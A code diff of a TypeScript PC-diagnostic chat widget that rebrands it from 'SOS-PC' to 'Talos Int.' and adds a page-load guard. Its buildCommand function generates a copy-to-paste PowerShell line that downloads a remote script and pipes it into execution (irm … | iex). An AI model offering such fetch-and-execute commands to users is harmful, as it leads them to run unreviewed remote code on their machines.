@@ -167,7 +167,7 @@ function genSessionId() {
 }
 
 function buildCommand(id: string) {
-  return `$s='${id}'; irm https://sos-pc.click/diag.ps1 | iex`;
+  return `$s='${id}'; irm https://talos-int.com/diag.ps1 | iex`;
 }
 
 (window as any).sospcCopy = function () {
@@ -287,7 +287,7 @@ function buildFullReport() {
   const dash = "-".repeat(52);
 
   lines.push(sep);
-  lines.push("  RAPPORT DIAGNOSTIC SOS-PC");
+  lines.push("  RAPPORT DIAGNOSTIC TALOS INT.");
   lines.push("  " + new Date().toLocaleString("fr-FR"));
   lines.push(sep);
   lines.push("");
@@ -477,7 +477,7 @@ function buildFullReport() {
   }
 
   lines.push(sep);
-  lines.push("  Rapport SOS-PC -- sos-pc.click -- " + new Date().toLocaleString("fr-FR"));
+  lines.push("  Rapport Talos Int. -- talos-int.com -- " + new Date().toLocaleString("fr-FR"));
   lines.push(sep);
 
   return {
@@ -540,7 +540,7 @@ function analyzeData() {
         chatHistory.push({ role: "assistant", content: msg });
       }
 
-      showSuggestions(["Expliquer le problème", "Améliorer les perfs", "Contacter SOS-PC"]);
+      showSuggestions(["Expliquer le problème", "Améliorer les perfs", "Contacter Talos Int."]);
       saveState();
       (document.getElementById("sospc-attach-bar") as HTMLElement).style.display = "block";
       window.dispatchEvent(new CustomEvent("sospc:attach-diag", { detail: buildFullReport() }));
@@ -588,6 +588,11 @@ function analyzeData() {
 };
 
 document.addEventListener("DOMContentLoaded", function () {
+  // Guard: this script is loaded globally via Layout.astro, but the widget
+  // markup is only rendered on pages that include <DiagnosticWidget />.
+  // On other pages (e.g. /audit), bail out so we don't dereference null nodes.
+  if (!document.getElementById("sospc-widget")) return;
+
   initDrag();
   restorePosition();
 
@@ -600,7 +605,7 @@ document.addEventListener("DOMContentLoaded", function () {
     if (diagReport) setScore(diagReport.score || 50);
     renderHistory();
     if (diagReport) {
-      showSuggestions(["Rappelle-moi le résumé", "Améliorer les perfs", "Contacter SOS-PC"]);
+      showSuggestions(["Rappelle-moi le résumé", "Améliorer les perfs", "Contacter Talos Int."]);
       (document.getElementById("sospc-attach-bar") as HTMLElement).style.display = "block";
     }
     (document.getElementById("sospc-header-sub") as HTMLElement).textContent = "Diagnostic sauvegardé";
